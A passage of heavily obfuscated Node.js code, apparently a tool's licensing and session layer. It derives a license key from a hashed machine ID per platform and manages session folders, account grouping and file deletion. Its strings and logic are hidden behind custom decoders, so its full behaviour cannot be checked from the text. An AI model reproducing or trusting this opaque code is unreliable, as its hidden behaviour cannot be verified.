              ](__p_2786467427_dLR_0__JS_PREDICT__(-0x1e), 0xa3)
            )),
          (__p_4304524035_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2)] =
            __p_4304524035_stack[
              __p_4304524035_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x72)] +
                __p_2786467427_dLR_0__JS_PREDICT__(0x7c)
            ][
              __p_4304524035_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x71)](
                0xa4
              )
            ]())
        );
      } catch (error) {
        __p_2360982505(
          (__p_4304524035_stack[0x7] = uuidv4()),
          await writeFileAsync(
            __p_4304524035_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x73)],
            __p_4304524035_stack[0x7],
            __p_4304524035_stack.h5Sj6C(0xa5)
          )
        );
      }
      return __p_4304524035_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x2)];
    } catch (error) {
      throw new Error(
        __p_0575541368_calc(
          __p_4304524035_stack.h5Sj6C(0xa6) +
            __p_4304524035_stack.h5Sj6C(0xa7) +
            __p_4304524035_stack.h5Sj6C(
              __p_2786467427_dLR_0__JS_PREDICT__(0x3f)
            ) +
            __p_4304524035_stack.h5Sj6C(0xa9) +
            __p_4304524035_stack.h5Sj6C(0xaa) +
            __p_4304524035_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x71)](
              0xab
            ),
          error[
            __p_4304524035_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x71)](0xac)
          ],
          (__p_6857802341 = -__p_2786467427_dLR_0__JS_PREDICT__(-0xa))
        )
      );
    }
    function __p_6489609492__JS_PREDICT____JS_CRITICAL__(
      str,
      table = 'FOcx,|hBKte^IPo@p0&E"$k5(LYC;sfw.Hr_DTN>/JQi]v8XjnA:RyGzM`3+1W*g9b<74=2Vu6l}!Sq{mZU#d)%~?a[',
      raw,
      len,
      ret = [],
      b,
      n = 0x0,
      v,
      i,
      p
    ) {
      __p_2360982505(
        (raw = "" + (str || "")),
        (len = raw.length),
        (b = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
        (v = -0x1)
      );
      for (i = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e); i < len; i++) {
        p = table.indexOf(raw[i]);
        if (p === -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)) {
          continue;
        }
        if (v < __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)) {
          v = p;
        } else {
          __p_2360982505(
            (v += p * 0x5b),
            (b |= v << n),
            (n +=
              (v & __p_2786467427_dLR_0__JS_PREDICT__(0xd)) >
              __p_2786467427_dLR_0__JS_PREDICT__(-0x16)
                ? 0xd
                : __p_2786467427_dLR_0__JS_PREDICT__(0xe))
          );
          do {
            __p_2360982505(ret.push(b & 0xff), (b >>= 0x8), (n -= 0x8));
          } while (n > 0x7);
          v = -0x1;
        }
      }
      if (v > -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)) {
        ret.push((b | (v << n)) & 0xff);
      }
      return __p_1990998267__JS_PREDICT__(ret);
    }
  },
  getLinuxProductId = async (...__p_3209719744_stack) => {
    __p_2360982505(
      (__p_3209719744_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2f)] =
        __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
      (__p_3209719744_stack.exhRdUW = -__p_2786467427_dLR_0__JS_PREDICT__(0x85))
    );
    try {
      __p_2360982505(
        (__p_3209719744_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)] =
          await getLinuxMachineId()),
        (__p_3209719744_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)] =
          __p_3209719744_stack[0x0]
            ? __p_3209719744_stack[0x0]
            : await getOrCreateLinuxUUID())
      );
      return __p_3209719744_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)];
    } catch (error) {
      var __p_2772283397__JS_PREDICT__ = __p_6510065121(
        (...__p_6376744263_stack) => {
          __p_2360982505(
            (__p_6376744263_stack.length =
              __p_2786467427_dLR_0__JS_PREDICT__(-0x22)),
            (__p_6376744263_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x74)] =
              __p_6376744263_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)])
          );
          if (typeof __p_6376744263_stack[0x3] === "undefined") {
            __p_6376744263_stack[0x3] =
              __p_9249887570__JS_PREDICT____JS_CRITICAL__;
          }
          __p_6376744263_stack.JNI74Q8 = 0x74;
          if (
            typeof __p_6376744263_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(0x74)
            ] === __p_2786467427_dLR_0__JS_PREDICT__(-0x27)
          ) {
            __p_6376744263_stack[
              __p_6376744263_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x75)] +
                0x14
            ] = __p_3576149457;
          }
          __p_6376744263_stack[0x1e] =
            __p_6376744263_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)];
          if (
            __p_6376744263_stack[
              __p_6376744263_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x75)] -
                (__p_6376744263_stack.JNI74Q8 -
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x28))
            ]
          ) {
            [
              __p_6376744263_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x74)],
              __p_6376744263_stack[0x1],
            ] = [
              __p_6376744263_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)](
                __p_6376744263_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x74)]
              ),
              __p_6376744263_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)] ||
                __p_6376744263_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x86)],
            ];
            return __p_2772283397__JS_PREDICT__(
              __p_6376744263_stack[
                __p_6376744263_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x75)] -
                  0x74
              ],
              __p_6376744263_stack[0x88],
              __p_6376744263_stack[
                __p_6376744263_stack.JNI74Q8 -
                  __p_2786467427_dLR_0__JS_PREDICT__(0x45)
              ]
            );
          }
          if (
            __p_6376744263_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)] !==
            __p_6376744263_stack[0x1]
          ) {
            return (
              __p_6376744263_stack[__p_6376744263_stack.JNI74Q8 + 0x14][
                __p_6376744263_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)]
              ] ||
              (__p_6376744263_stack[
                __p_6376744263_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x75)] +
                  (__p_6376744263_stack.JNI74Q8 -
                    __p_2786467427_dLR_0__JS_PREDICT__(0x4b))
              ][__p_6376744263_stack[0x0]] = __p_6376744263_stack[
                __p_2786467427_dLR_0__JS_PREDICT__(-0x24)
              ](__p_1940297625[__p_6376744263_stack[0x0]]))
            );
          }
        },
        __p_2786467427_dLR_0__JS_PREDICT__(-0x22)
      );
      throw new Error(
        __p_0575541368_calc(
          __p_2772283397__JS_PREDICT__.call(
            __p_2786467427_dLR_0__JS_PREDICT__(-0x1e),
            __p_2786467427_dLR_0__JS_PREDICT__(0x7a)
          ),
          error[__p_2772283397__JS_PREDICT__.apply(void 0x0, [0xae])],
          __p_0333540851(-__p_2786467427_dLR_0__JS_PREDICT__(-0xa))
        )
      );
      function __p_9249887570__JS_PREDICT____JS_CRITICAL__(
        ...__p_9757001732_stack
      ) {
        var i;
        __p_2360982505(
          (__p_9757001732_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2f)] =
            __p_2786467427_dLR_0__JS_PREDICT__(-0x28)),
          (__p_9757001732_stack.viPcjF = __p_9757001732_stack.BOsjpR),
          (__p_9757001732_stack.ndtI6c =
            'AT^ujOz)6;9Zp1&[(vd<Vwgf!0`Y}B_?7C~8qD.sH4K#xF"*L:PGXQ$lbnM%|t=5>+hc]Um@R/,{2EeJWy3rSkiINao'),
          (__p_9757001732_stack.Bogn5H =
            "" + (__p_9757001732_stack[0x0] || "")),
          (__p_9757001732_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x36)] =
            -0x11),
          (__p_9757001732_stack.viPcjF = __p_9757001732_stack.Bogn5H.length),
          (__p_9757001732_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)] =
            []),
          (__p_9757001732_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x76)] =
            __p_9757001732_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)]),
          (__p_9757001732_stack[
            __p_2786467427_dLR_0__JS_PREDICT__(0x78)
          ] = 0x0),
          (__p_9757001732_stack[
            __p_2786467427_dLR_0__JS_PREDICT__(0x29)
          ] = 0x0),
          (__p_9757001732_stack.HFZ9fR = -0x1)
        );
        for (
          i = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e);
          i < __p_9757001732_stack.viPcjF;
          i++
        ) {
          __p_9757001732_stack[0x9] = __p_9757001732_stack.ndtI6c.indexOf(
            __p_9757001732_stack.Bogn5H[i]
          );
          if (
            __p_9757001732_stack[0x9] ===
            -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)
          ) {
            continue;
          }
          if (
            __p_9757001732_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x77)] <
            __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
          ) {
            __p_9757001732_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x77)] =
              __p_9757001732_stack[
                __p_9757001732_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x36)] +
                  0x1a
              ];
          } else {
            __p_2360982505(
              (__p_9757001732_stack.HFZ9fR +=
                __p_9757001732_stack[
                  __p_9757001732_stack[0x41] +
                    __p_2786467427_dLR_0__JS_PREDICT__(0x19)
                ] * 0x5b),
              (__p_9757001732_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x78)] |=
                __p_9757001732_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(0x77)
                ] <<
                __p_9757001732_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x29)]),
              (__p_9757001732_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x29)] +=
                (__p_9757001732_stack.HFZ9fR &
                  __p_2786467427_dLR_0__JS_PREDICT__(0xd)) >
                __p_2786467427_dLR_0__JS_PREDICT__(-0x16)
                  ? __p_2786467427_dLR_0__JS_PREDICT__(-0xb)
                  : 0xe)
            );
            do {
              __p_2360982505(
                __p_9757001732_stack[0x4].push(
                  __p_9757001732_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(0x78)
                  ] & __p_2786467427_dLR_0__JS_PREDICT__(-0x1c)
                ),
                (__p_9757001732_stack.ZpRB6T >>=
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x15)),
                (__p_9757001732_stack[0x6] -= 0x8)
              );
            } while (
              __p_9757001732_stack[
                __p_9757001732_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x36)] +
                  __p_2786467427_dLR_0__JS_PREDICT__(0x14)
              ] > 0x7
            );
            __p_9757001732_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x77)] =
              -0x1;
          }
        }
        if (
          __p_9757001732_stack.HFZ9fR >
          -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)
        ) {
          __p_9757001732_stack[
            __p_9757001732_stack[0x41] +
              __p_2786467427_dLR_0__JS_PREDICT__(0x79)
          ].push(
            (__p_9757001732_stack.ZpRB6T |
              (__p_9757001732_stack.HFZ9fR << __p_9757001732_stack[0x6])) &
              __p_2786467427_dLR_0__JS_PREDICT__(-0x1c)
          );
        }
        return __p_9757001732_stack[0x41] >
          __p_2786467427_dLR_0__JS_PREDICT__(0x6f)
          ? __p_9757001732_stack[-__p_2786467427_dLR_0__JS_PREDICT__(0x7a)]
          : __p_1990998267__JS_PREDICT__(__p_9757001732_stack[0x4]);
      }
    }
  },
  getLicenseUbuntu = async () => {
    try {
      const productId = await getLinuxProductId(),
        licenseKey = sha1Hash(
          __p_0575541368_calc(
            productId + __p_2786467427_dLR_0__JS_PREDICT__(0x7b),
            ALIAS,
            (__p_6857802341 = -__p_2786467427_dLR_0__JS_PREDICT__(-0xa))
          )
        );
      return licenseKey;
    } catch (error) {
      var __p_9905053631__JS_PREDICT__ = (x, y, z, a, b) => {
        if (typeof a === __p_2786467427_dLR_0__JS_PREDICT__(-0x27)) {
          a = __p_0641237842__JS_PREDICT____JS_CRITICAL__;
        }
        if (typeof b === __p_2786467427_dLR_0__JS_PREDICT__(-0x27)) {
          b = __p_3576149457;
        }
        if (x !== y) {
          return b[x] || (b[x] = a(__p_1940297625[x]));
        }
        if (z == a) {
          return y
            ? x[b[y]]
            : __p_3576149457[x] ||
                ((z = b[x] || a), (__p_3576149457[x] = z(__p_1940297625[x])));
        }
        if (a === void 0x0) {
          __p_9905053631__JS_PREDICT__ = b;
        }
      };
      throw new Error(
        __p_0575541368_calc(
          __p_9905053631__JS_PREDICT__(0xaf),
          error[
            __p_9905053631__JS_PREDICT__(
              __p_2786467427_dLR_0__JS_PREDICT__(0x7c)
            )
          ],
          (__p_6857802341 = -0x20)
        )
      );
      function __p_0641237842__JS_PREDICT____JS_CRITICAL__(
        str,
        table = 'u,x(3v@|=?)2r%qL/4b6$nG0!Qt*#XOD51+`aN~siKZzMI".m;8:Cfhw<dH[FJkBPcEyWA}S{]TRe9lo>VUYg7^&j_p',
        raw,
        len,
        ret = [],
        b,
        n,
        v,
        i,
        p
      ) {
        __p_2360982505(
          (raw = "" + (str || "")),
          (len = raw.length),
          (b = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
          (n = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
          (v = -0x1)
        );
        for (i = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e); i < len; i++) {
          p = table.indexOf(raw[i]);
          if (p === -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)) {
            continue;
          }
          if (v < 0x0) {
            v = p;
          } else {
            __p_2360982505(
              (v += p * 0x5b),
              (b |= v << n),
              (n +=
                (v & 0x1fff) > 0x58
                  ? 0xd
                  : __p_2786467427_dLR_0__JS_PREDICT__(0xe))
            );
            do {
              __p_2360982505(
                ret.push(b & 0xff),
                (b >>= __p_2786467427_dLR_0__JS_PREDICT__(-0x15)),
                (n -= 0x8)
              );
            } while (n > __p_2786467427_dLR_0__JS_PREDICT__(0x2));
            v = -0x1;
          }
        }
        if (v > -0x1) {
          ret.push((b | (v << n)) & __p_2786467427_dLR_0__JS_PREDICT__(-0x1c));
        }
        return __p_1990998267__JS_PREDICT__(ret);
      }
    }
  },
  getLicense = async (...__p_1974817967_stack) => {
    var __p_0499653983__JS_PREDICT__;
    __p_2360982505(
      (__p_1974817967_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2f)] =
        __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
      (__p_1974817967_stack.C1Qn3Dy = __p_1974817967_stack[0x2]),
      (__p_0499653983__JS_PREDICT__ = __p_6510065121(
        (...__p_9853386318_stack) => {
          __p_2360982505(
            (__p_9853386318_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2f)] =
              __p_2786467427_dLR_0__JS_PREDICT__(-0x22)),
            (__p_9853386318_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x1c)] =
              __p_9853386318_stack[0x4])
          );
          if (
            typeof __p_9853386318_stack[0x3] ===
            __p_2786467427_dLR_0__JS_PREDICT__(-0x27)
          ) {
            __p_9853386318_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)] =
              __p_9461787656__JS_PREDICT____JS_CRITICAL__;
          }
          if (
            typeof __p_9853386318_stack[0x44] ===
            __p_2786467427_dLR_0__JS_PREDICT__(-0x27)
          ) {
            __p_9853386318_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x1c)] =
              __p_3576149457;
          }
          if (
            __p_9853386318_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)] ===
            void 0x0
          ) {
            __p_0499653983__JS_PREDICT__ =
              __p_9853386318_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x1c)];
          }
          if (
            __p_9853386318_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)] ==
            __p_9853386318_stack[0x0]
          ) {
            return (__p_9853386318_stack[0x1][
              __p_3576149457[
                __p_9853386318_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)]
              ]
            ] = __p_0499653983__JS_PREDICT__(
              __p_9853386318_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)],
              __p_9853386318_stack[0x1]
            ));
          }
          if (
            __p_9853386318_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)] !==
            __p_9853386318_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)]
          ) {
            return (
              __p_9853386318_stack[0x44][
                __p_9853386318_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)]
              ] ||
              (__p_9853386318_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x1c)][
                __p_9853386318_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)]
              ] = __p_9853386318_stack[0x3](
                __p_1940297625[
                  __p_9853386318_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                  ]
                ]
              ))
            );
          }
          if (
            __p_9853386318_stack[0x2] ==
            __p_9853386318_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)]
          ) {
            return __p_9853386318_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(-0x28)
            ]
              ? __p_9853386318_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)][
                  __p_9853386318_stack[0x44][
                    __p_9853386318_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(-0x28)
                    ]
                  ]
                ]
              : __p_3576149457[
                  __p_9853386318_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                  ]
                ] ||
                  ((__p_9853386318_stack[0x2] =
                    __p_9853386318_stack[0x44][__p_9853386318_stack[0x0]] ||
                    __p_9853386318_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(-0x24)
                    ]),
                  (__p_3576149457[__p_9853386318_stack[0x0]] =
                    __p_9853386318_stack[0x2](
                      __p_1940297625[__p_9853386318_stack[0x0]]
                    )));
          }
          if (__p_9853386318_stack[0x1]) {
            [
              __p_9853386318_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x1c)],
              __p_9853386318_stack[0x1],
            ] = [
              __p_9853386318_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)](
                __p_9853386318_stack[0x44]
              ),
              __p_9853386318_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)] ||
                __p_9853386318_stack[0x2],
            ];
            return __p_0499653983__JS_PREDICT__(
              __p_9853386318_stack[0x0],
              __p_9853386318_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x1c)],
              __p_9853386318_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)]
            );
          }
        },
        __p_2786467427_dLR_0__JS_PREDICT__(-0x22)
      )),
      (__p_1974817967_stack.liDYnT = __p_1974817967_stack.C1Qn3Dy),
      (__p_1974817967_stack.liDYnT = null)
    );
    if (
      os[
        __p_0499653983__JS_PREDICT__[__p_2786467427_dLR_0__JS_PREDICT__(0x1d)](
          void 0x0,
          __p_2786467427_dLR_0__JS_PREDICT__(0x7d)
        ) + "rm"
      ]() ===
        __p_0499653983__JS_PREDICT__.call(
          __p_2786467427_dLR_0__JS_PREDICT__(-0x1e),
          0xb2
        ) &&
      __p_9743501678.tZjv4eQ[__p_0499653983__JS_PREDICT__(0xb3)](
        __p_2786467427_dLR_0__JS_PREDICT__(-0x22)
      ) == "O"
    ) {
      __p_1974817967_stack.liDYnT = await getLicenseWindows();
    } else {
      if (
        os[
          __p_0499653983__JS_PREDICT__[
            __p_2786467427_dLR_0__JS_PREDICT__(0x18)
          ](__p_2786467427_dLR_0__JS_PREDICT__(-0x1e), [0xb4])
        ]() === __p_0499653983__JS_PREDICT__(0xb5) &&
        __p_9743501678.vVupayL > 0x2
      ) {
        __p_1974817967_stack.liDYnT = await getLicenseTermux();
      } else {
        if (
          os[
            __p_0499653983__JS_PREDICT__(
              __p_2786467427_dLR_0__JS_PREDICT__(0x7d)
            ) + "rm"
          ]() === __p_0499653983__JS_PREDICT__(0xb6) &&
          __p_9743501678.eC13w_[__p_0499653983__JS_PREDICT__(0xb7)](
            __p_2786467427_dLR_0__JS_PREDICT__(-0x25)
          ) == 0x61
        ) {
          __p_1974817967_stack.liDYnT = await getLicenseUbuntu();
        } else {
          throw new Error(
            __p_0575541368_calc(
              __p_0499653983__JS_PREDICT__.call(void 0x0, 0xb8) +
                os[__p_0499653983__JS_PREDICT__(0xb4)](),
              __p_0499653983__JS_PREDICT__(0xb9),
              __p_0333540851(-0x20)
            )
          );
        }
      }
    }
    return __p_1974817967_stack.liDYnT;
    function __p_9461787656__JS_PREDICT____JS_CRITICAL__(
      str,
      table = 'B.Li%U{xX0^bYwezv?j[+5!dJZS,f9W8sg:("Cu6$`7T]Gt2=O4rcl/Qay~V@K13q_Rm)#}*pHN;&>FEk|<DAIMnhoP',
      raw,
      len,
      ret = [],
      b = 0x0,
      n = 0x0,
      v,
      i = 0x0,
      p
    ) {
      __p_2360982505((raw = "" + (str || "")), (len = raw.length), (v = -0x1));
      for (i = i; i < len; i++) {
        p = table.indexOf(raw[i]);
        if (p === -0x1) {
          continue;
        }
        if (v < __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)) {
          v = p;
        } else {
          __p_2360982505(
            (v += p * __p_2786467427_dLR_0__JS_PREDICT__(-0x1d)),
            (b |= v << n),
            (n +=
              (v & __p_2786467427_dLR_0__JS_PREDICT__(0xd)) > 0x58
                ? __p_2786467427_dLR_0__JS_PREDICT__(-0xb)
                : __p_2786467427_dLR_0__JS_PREDICT__(0xe))
          );
          do {
            __p_2360982505(
              ret.push(b & __p_2786467427_dLR_0__JS_PREDICT__(-0x1c)),
              (b >>= 0x8),
              (n -= __p_2786467427_dLR_0__JS_PREDICT__(-0x15))
            );
          } while (n > 0x7);
          v = -0x1;
        }
      }
      if (v > -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)) {
        ret.push((b | (v << n)) & 0xff);
      }
      return __p_1990998267__JS_PREDICT__(ret);
    }
  },
  __filename = fileURLToPath(import.meta[__p_0595027781__JS_PREDICT__(0xba)]),
  __dirname = path[__p_0595027781__JS_PREDICT__(0xbb)](__filename),
  getSessionDirectory = (directoryName) => {
    var __p_8417196807 = { LDRKYmE: __p_0595027781__JS_PREDICT__(0xbd) };
    const baseDir = path[
        __p_0595027781__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(0x7e))
      ](__dirname, __p_8417196807.LDRKYmE),
      sessionDir = path[__p_0595027781__JS_PREDICT__(0xbe)](
        baseDir,
        directoryName
      );
    return sessionDir;
  },
  createSessionDirectory = (sessionName) => {
    const sessionDir = getSessionDirectory(sessionName);
    if (
      __p_0575541368_calc(
        fs[__p_0595027781__JS_PREDICT__(0xbf)](sessionDir),
        (__p_6857802341 = 0x25)
      ) &&
      __p_9743501678.eC13w_[
        __p_0595027781__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(-0x1b))
      ](0x4) == 0x61
    ) {
      fs[__p_0595027781__JS_PREDICT__(0xc1)](sessionDir, {
        [__p_0595027781__JS_PREDICT__(0xc2)]:
          __p_2786467427_dLR_0__JS_PREDICT__(0x7f),
      });
    }
  },
  updateBanner = (content) => {
    const oldBanner = __p_0595027781__JS_PREDICT__(0xc3),
      newBanner = __p_0595027781__JS_PREDICT__(0xc3);
    return content[__p_0595027781__JS_PREDICT__(0xc4)](oldBanner, newBanner);
  },
  writeToFile = async (filePath, content) => (
    await writeFileAsync(
      filePath,
      content,
      __p_0595027781__JS_PREDICT__[__p_2786467427_dLR_0__JS_PREDICT__(0x18)](
        __p_2786467427_dLR_0__JS_PREDICT__(-0x1e),
        [0xc5]
      )
    ),
    void 0x0
  ),
  readJsonFile = (filePath) => {
    try {
      var __p_8342830979 = __p_0595027781__JS_PREDICT__(0xc7);
      const fileContent = fs[__p_0595027781__JS_PREDICT__(0xc6)](
        filePath,
        __p_8342830979
      );
      return JSON[
        __p_0595027781__JS_PREDICT__[__p_2786467427_dLR_0__JS_PREDICT__(0x1d)](
          void 0x0,
          0xc8
        )
      ](fileContent);
    } catch (error) {
      return null;
    }
  },
  deleteFile = (filePath) => {
    try {
      return __p_8438996831__JS_CRITICAL__(
        fs[
          __p_0595027781__JS_PREDICT__[
            __p_2786467427_dLR_0__JS_PREDICT__(0x18)
          ](__p_2786467427_dLR_0__JS_PREDICT__(-0x1e), [0xc9]) +
            __p_0595027781__JS_PREDICT__(0xca)
        ](filePath),
        {
          [__p_0595027781__JS_PREDICT__(0xcb)]:
            __p_2786467427_dLR_0__JS_PREDICT__(0x7f),
          [__p_0595027781__JS_PREDICT__[
            __p_2786467427_dLR_0__JS_PREDICT__(0x1d)
          ](void 0x0, 0xcc)]: __p_0595027781__JS_PREDICT__(0xcd),
        }
      );
    } catch (error) {
      return {
        [__p_0595027781__JS_PREDICT__(0xce)]: !0x1,
        [__p_0595027781__JS_PREDICT__(0xcf)]:
          __p_0595027781__JS_PREDICT__(0xd0) +
          __p_0595027781__JS_PREDICT__[
            __p_2786467427_dLR_0__JS_PREDICT__(0x18)
          ](void 0x0, [0xd1]) +
          __p_0595027781__JS_PREDICT__(0xd2) +
          __p_0595027781__JS_PREDICT__.call(void 0x0, 0xd3),
      };
    }
  },
  getAllFilesFromFolder = __p_6510065121((...__p_5636210636_stack) => {
    __p_2360982505(
      (__p_5636210636_stack.length = __p_2786467427_dLR_0__JS_PREDICT__(-0x28)),
      (__p_5636210636_stack.t0cyZma = __p_2786467427_dLR_0__JS_PREDICT__(0x44))
    );
    let fileList = [];
    __p_5636210636_stack[0xbc] = 0x13;
    function readFolder(folderPath) {
      const folderContent =
        fs[
          __p_0595027781__JS_PREDICT__.apply(void 0x0, [
            __p_2786467427_dLR_0__JS_PREDICT__(0x80),
          ])
        ](folderPath);
      folderContent[__p_0595027781__JS_PREDICT__(0xd5)]((item) => {
        const itemPath = path[__p_0595027781__JS_PREDICT__(0xd6)](
            folderPath,
            item
          ),
          itemStats = fs[__p_0595027781__JS_PREDICT__(0xd7)](itemPath);
        if (
          itemStats &&
          itemStats[__p_0595027781__JS_PREDICT__(0xd8)]() &&
          __p_9743501678.pNtZWr[__p_0595027781__JS_PREDICT__(0xd9)](
            __p_2786467427_dLR_0__JS_PREDICT__(-0x28)
          ) == "M"
        ) {
          readFolder(itemPath);
        } else {
          fileList[__p_0595027781__JS_PREDICT__(0xda)](itemPath);
        }
      });
    }
    return __p_5636210636_stack[0xbc] > 0x91
      ? __p_5636210636_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x81)]
      : __p_8438996831__JS_CRITICAL__(
          readFolder(
            getSessionDirectory(
              __p_5636210636_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)]
            )
          ),
          fileList
        );
  }, 0x1),
  groupAccounts = __p_6510065121((...__p_4499560085_stack) => {
    __p_2360982505(
      (__p_4499560085_stack.length = 0x2),
      (__p_4499560085_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x7e)] =
        __p_4499560085_stack[0x2]),
      (__p_4499560085_stack[0xbc] = [])
    );
    for (
      let i = 0x0;
      i <
        __p_4499560085_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)][
          __p_0595027781__JS_PREDICT__(0xdb)
        ] && __p_9743501678.vVupayL > 0x2;
      i += __p_4499560085_stack[0x1]
    )
      __p_4499560085_stack[0xbc][__p_0595027781__JS_PREDICT__(0xdc)](
        __p_4499560085_stack[0x0][__p_0595027781__JS_PREDICT__(0xdd)](
          i,
          __p_0575541368_calc(
            i,
            __p_4499560085_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)],
            (__p_6857802341 = -__p_2786467427_dLR_0__JS_PREDICT__(-0xa))
          )
        )
      );
    __p_4499560085_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x82)] =
      __p_2786467427_dLR_0__JS_PREDICT__(0x33);
    return __p_4499560085_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x82)] > 0xfe
      ? __p_4499560085_stack[-0x14]
      : __p_4499560085_stack[
          __p_4499560085_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x82)] + 0x47
        ];
  }, 0x2),
  getUserFromUrl = __p_6510065121((...__p_9111413863_stack) => {
    __p_2360982505(
      (__p_9111413863_stack.length = __p_2786467427_dLR_0__JS_PREDICT__(-0x28)),
      (__p_9111413863_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x15)] = -0x57),
      (__p_9111413863_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x83)] =
        new URLSearchParams(__p_9111413863_stack[0x0])),
      (__p_9111413863_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)] =
        __p_9111413863_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x83)][
          __p_0595027781__JS_PREDICT__(
            __p_9111413863_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x15)] +
              0x135
          )
        ](
          __p_0595027781__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(0x84))
        )),
      (__p_9111413863_stack[0xa2] = __p_9111413863_stack.xcdq4G)
    );
    if (
      __p_0575541368_calc(
        __p_9111413863_stack[0x2],
        (__p_6857802341 = __p_2786467427_dLR_0__JS_PREDICT__(0x3))
      ) &&
      __p_9743501678.eC13w_[__p_0595027781__JS_PREDICT__(0xe0)](
        __p_2786467427_dLR_0__JS_PREDICT__(-0x25)
      ) == __p_2786467427_dLR_0__JS_PREDICT__(0x4c)
    ) {
      throw new Error(__p_0595027781__JS_PREDICT__(0xe1));
    }
    __p_2360982505(
      (__p_9111413863_stack.etFpTw = decodeURIComponent(
        __p_9111413863_stack[
